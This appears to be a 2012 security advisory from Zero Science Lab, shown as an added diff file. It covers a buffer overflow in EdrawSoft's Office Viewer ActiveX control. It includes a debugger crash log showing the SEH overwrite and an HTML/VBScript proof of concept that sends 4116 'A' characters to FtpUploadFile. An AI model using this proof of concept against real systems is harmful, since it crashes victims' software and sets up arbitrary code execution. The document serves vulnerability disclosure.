@@ -1,0 +1,105 @@
+EdrawSoft Office Viewer Component ActiveX 5.6 (officeviewermme.ocx) BoF PoC
+
+
+Vendor: EdrawSoft
+Product web page: http://www.edrawsoft.com
+Affected version: 5.6.5781
+
+Summary: Edraw Office Viewer Component contains a standard ActiveX control
+that acts as an ActiveX document container for hosting Office documents
+(including Microsoft Word, Microsoft Excel, Microsoft PowerPoint, Microsoft
+Project, and Microsoft Visio documents) in a custom form or Web page. The
+control is lightweight and flexible, and gives developers new possibilities
+for using Office in a custom solution.
+
+Desc: The ActiveX suffers from a buffer overflow vulnerability when parsing
+large amount of bytes to the FtpUploadFile member in FtpUploadFile() function,
+resulting memory corruption overwriting severeal registers including the SEH.
+An attacker can gain access to the system of the affected node and execute
+arbitrary code.
+
+
+Tested on Microsoft Windows XP Professional SP3 (EN)
+
+
+-------------------------------------------------------------------------
+
+(6c9c.6c70): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000041 ebx=00001015 ecx=000002a0 edx=001b2edc esi=0186e518 edi=01870000
+eip=220324cc esp=0186c488 ebp=0186c490 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Mindjet\MindManager 10\officeviewermme.ocx - 
+officeviewermme!DllRegisterServer+0x23bbe:
+220324cc 668907          mov     word ptr [edi],ax        ds:0023:01870000=????
+0:004> !exchain
+0186fa84: 00410041
+Invalid exception stack at 00410041
+0:004> d esi
+0186e518  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0186e528  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0186e538  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0186e548  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0186e558  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0186e568  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0186e578  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0186e588  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0:004> d edx
+001b2edc  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+001b2eec  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+001b2efc  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+001b2f0c  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+001b2f1c  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+001b2f2c  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+001b2f3c  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+001b2f4c  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0:004> d esp+3000
+0186f488  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0186f498  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0186f4a8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0186f4b8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0186f4c8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0186f4d8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0186f4e8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0186f4f8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0:004> !load msec; !exploitable
+Exploitability Classification: EXPLOITABLE
+Recommended Bug Title: Exploitable - User Mode Write AV starting at officeviewermme!DllRegisterServer+0x0000000000023bbe (Hash=0x55146322.0x550a2c22)
+
+User mode write access violations that are not near NULL are exploitable.
+
+-------------------------------------------------------------------------
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            liquidworm gmail com
+                            Zero Science Lab - http://www.zeroscience.mk
+
+
+Advisory ID: ZSL-2012-5069
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5069.php
+
+Related ID: ZSL-2012-5068
+
+
+25.01.2012
+
+---
+
+
+<object classid='clsid:F6FE8878-54D2-4333-B9F0-FC543B1BE1ED' id='ZSL' />
+<script language='vbscript'>
+
+targetFile = "C:\Program Files\Mindjet\MindManager 10\officeviewermme.ocx"
+prototype  = "Function FtpUploadFile ( ByVal LocalFile As String ,  ByVal RemoteFile As String ) As Boolean"
+memberName = "FtpUploadFile"
+progid     = "OfficeViewer.OfficeViewer"
+argCount   = 2
+
+arg1="defaultV"
+arg2=String(4116, "A")
+
+ZSL.FtpUploadFile arg1 ,arg2 
+
+</script>
